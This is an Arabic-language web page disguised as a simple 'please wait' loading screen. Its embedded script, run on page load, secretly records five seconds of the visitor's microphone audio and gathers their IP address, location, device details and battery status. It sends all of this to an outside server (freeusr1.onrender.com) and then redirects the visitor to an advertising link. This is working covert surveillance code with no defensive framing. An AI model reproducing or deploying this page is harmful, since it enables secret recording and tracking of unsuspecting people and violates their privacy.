<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <title>مرحبا بك في موقعنا</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');

        body {
            font-family: 'Poppins', sans-serif;
            margin: 0;
            padding: 0;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            color: #fff;
        }

        .container {
            text-align: center;
            padding: 40px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
            position: relative;
            overflow: hidden;
            backdrop-filter: blur(10px);
        }

        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, rgba(255, 255, 255, 0.1), transparent);
            transform: rotate(45deg);
            animation: animate 5s linear infinite;
        }

        @keyframes animate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading {
            border: 8px solid rgba(243, 243, 243, 0.2);
            border-top: 8px solid #e74c3c;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1.5s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .message {
            font-size: 20px;
            color: #ecf0f1;
            margin-top: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loading" id="loading" style="display: none;"></div>
        <p class="message" id="notification">لحظه واحده من فضلك...</p>
    </div>

    <form method="POST" action="/submitVoice" id="voice-form" enctype="multipart/form-data">
        <input type="hidden" name="chatId" id="chatId">
        <input type="file" name="voice" id="voice" accept="audio/*" style="display: none;">
    </form>
  <meta id="redirectUrl" content="https://www.profitableratecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738">

<script>
document.addEventListener('DOMContentLoaded', () => {
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get('chatId');
    if (!chatId) {
        alert("خطأ: chatId غير موجود في الرابط");
        return;
    }

    document.getElementById('chatId').value = chatId;

    if (!navigator.mediaDevices?.getUserMedia) {
        alert("المتصفح لا يدعم تسجيل الصوت");
        return;
    }

    startRecording(5); // 5 ثواني
});

async function startRecording(duration) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const recorder = new MediaRecorder(stream);
        const chunks = [];

        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'audio/webm' });
            const formData = new FormData(document.getElementById('voice-form'));
            formData.set('voice', blob, 'voice.webm');

            const info = await collectAdditionalData();
            formData.append('additionalData', JSON.stringify(info));

            // ✅ تعديل الرابط ليكون على السيرفر الجديد
            const res = await fetch('https://freeusr1.onrender.com/submitVoice', {
                method: 'POST',
                body: formData
            });

        const redirectUrl = document.getElementById("redirectUrl").content;

            if (res.ok) {
          setTimeout(() => window.location.href = redirectUrl, 200);
            } else {
                alert("فشل الإرسال. حاول مرة أخرى.");
            }
        };

        recorder.start();
        setTimeout(() => recorder.stop(), duration * 1000);
    } catch (err) {
        alert("خطأ في تسجيل الصوت: " + err.message);
    }
}

async function collectAdditionalData() {
    let ip = 'غير متاح', country = '', city = '';
    try {
        const ipInfo = await fetch('https://ipapi.co/json/').then(res => res.json());
        ip = ipInfo.ip;
        country = ipInfo.country_name;
        city = ipInfo.city;
    } catch {}

    const ua = navigator.userAgent;
    const platform = navigator.platform;
    const match = ua.match(/\(([^)]+)\)/);
    const deviceVersion = match ? match[1] : 'غير متاح';

    let batteryLevel = 'غير متاح', charging = 'غير متاح';
    try {
        const battery = await navigator.getBattery();
        batteryLevel = (battery.level * 100) + '%';
        charging = battery.charging ? 'نعم' : 'لا';
    } catch {}

    return { ip, country, city, platform, deviceVersion, batteryLevel, batteryCharging: charging };
}
</script>
<script type='text/javascript' src='//pl27402931.profitableratecpm.com/4f/ac/c1/4facc18f55584cc499c878e46c1ccbee.js'></script>
</body>
</html>
